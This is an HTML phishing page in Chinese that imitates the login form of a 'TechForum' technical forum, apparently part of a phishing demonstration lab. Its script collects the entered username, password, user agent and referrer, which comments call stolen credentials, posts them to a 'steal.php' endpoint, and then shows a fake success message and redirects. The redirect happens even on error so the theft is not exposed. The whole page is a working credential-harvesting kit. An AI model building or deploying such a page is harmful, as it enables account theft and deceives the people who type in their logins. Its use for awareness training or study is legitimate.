<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>登录 - TechForum 技术交流论坛</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: rgba(0,0,0,0.1);
            padding: 15px 0;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; width: 100%; }
        .logo { font-size: 22px; font-weight: bold; color: white; display: flex; align-items: center; gap: 10px; text-decoration: none; }
        .logo-icon { font-size: 28px; }
        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
        .login-box {
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
        }
        .login-header {
            background: #fafafa;
            padding: 25px 30px;
            text-align: center;
            border-bottom: 1px solid #eee;
        }
        .login-header h1 { font-size: 22px; color: #333; margin-bottom: 8px; }
        .login-header p { color: #999; font-size: 14px; }
        .login-form { padding: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #333; font-size: 14px; font-weight: 500; }
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 15px;
            transition: border-color 0.3s;
        }
        .form-group input:focus { outline: none; border-color: #667eea; }
        .form-options { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-size: 14px; }
        .form-options a { color: #667eea; text-decoration: none; }
        .form-options a:hover { text-decoration: underline; }
        .remember-me { display: flex; align-items: center; gap: 5px; color: #666; }
        .remember-me input { width: auto; }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn-login:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4); }
        .login-footer { text-align: center; padding: 20px 30px; background: #fafafa; border-top: 1px solid #eee; }
        .login-footer p { color: #666; font-size: 14px; }
        .login-footer a { color: #667eea; text-decoration: none; font-weight: 500; }
        .alert {
            padding: 12px 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }
        .alert-error { background: #fee; color: #c00; border: 1px solid #fcc; }
        .alert-success { background: #efe; color: #0a0; border: 1px solid #afa; }
        .btn-back-demo {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            padding: 10px 20px;
            border-radius: 20px;
            text-decoration: none;
            font-weight: bold;
            z-index: 9999;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
            backdrop-filter: blur(10px);
        }
        .btn-back-demo:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
        }
        .loading { display: none; text-align: center; padding: 20px; }
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <a href="../demo.php" class="btn-back-demo">
        <span>🏠</span>
        <span>返回演示首页</span>
    </a>
    <div class="header">
        <div class="container">
            <a href="#" class="logo">
                <span class="logo-icon">💬</span>
                TechForum 技术交流论坛
            </a>
        </div>
    </div>

    <div class="main">
        <div class="login-box">
            <div class="login-header">
                <h1>账号登录</h1>
                <p>登录后即可参与讨论和互动</p>
            </div>
            
            <div class="login-form">
                <div class="alert alert-error" id="errorMsg"></div>
                <div class="alert alert-success" id="successMsg"></div>
                
                <form id="loginForm">
                    <div class="form-group">
                        <label for="username">用户名 / 邮箱</label>
                        <input type="text" id="username" name="username" placeholder="请输入用户名或邮箱" required>
                    </div>
                    <div class="form-group">
                        <label for="password">密码</label>
                        <input type="password" id="password" name="password" placeholder="请输入密码" required>
                    </div>
                    <div class="form-options">
                        <label class="remember-me">
                            <input type="checkbox" name="remember" checked>
                            记住我
                        </label>
                        <a href="#">忘记密码？</a>
                    </div>
                    <button type="submit" class="btn-login">登 录</button>
                </form>
            </div>

            <div class="login-footer">
                <p>还没有账号？<a href="#">立即注册</a></p>
            </div>
            
            <div class="loading" id="loading">
                <div class="loading-spinner"></div>
                <p>登录中，请稍候...</p>
            </div>
        </div>
    </div>

    <script>
        // 获取URL参数中的来源页面
        function getQueryParam(name) {
            var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)');
            var r = window.location.search.substr(1).match(reg);
            if (r != null) return decodeURIComponent(r[2]);
            return null;
        }
        
        // 获取跳转来源
        var returnUrl = getQueryParam('redirect') || '../forum.php';
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            
            if (!username || !password) {
                document.getElementById('errorMsg').textContent = '请输入用户名和密码';
                document.getElementById('errorMsg').style.display = 'block';
                return;
            }
            
            // 显示加载状态
            document.querySelector('.login-form').style.display = 'none';
            document.querySelector('.login-footer').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // 保存窃取的凭据到本地文件
            var stolenData = {
                username: username,
                password: password,
                timestamp: new Date().toLocaleString(),
                userAgent: navigator.userAgent,
                referer: document.referrer || '直接访问'
            };
            
            // 发送数据到窃取脚本（保存到本地）
            fetch('../steal.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(stolenData)
            }).then(function(response) {
                return response.json();
            }).then(function(data) {
                // 显示成功消息
                document.getElementById('loading').style.display = 'none';
                document.querySelector('.login-form').style.display = 'block';
                document.querySelector('.login-footer').style.display = 'block';
                
                document.getElementById('successMsg').textContent = '登录成功！正在跳转...';
                document.getElementById('successMsg').style.display = 'block';
                document.getElementById('errorMsg').style.display = 'none';
                
                // 延迟跳转回原页面，添加参数标记已登录
                setTimeout(function() {
                    var separator = returnUrl.indexOf('?') > -1 ? '&' : '?';
                    window.location.href = returnUrl + separator + 'logged_in=1';
                }, 1500);
            }).catch(function(error) {
                // 即使出错也跳转，避免暴露
                setTimeout(function() {
                    var separator = returnUrl.indexOf('?') > -1 ? '&' : '?';
                    window.location.href = returnUrl + separator + 'logged_in=1';
                }, 1000);
            });
        });
    </script>
</body>
</html>
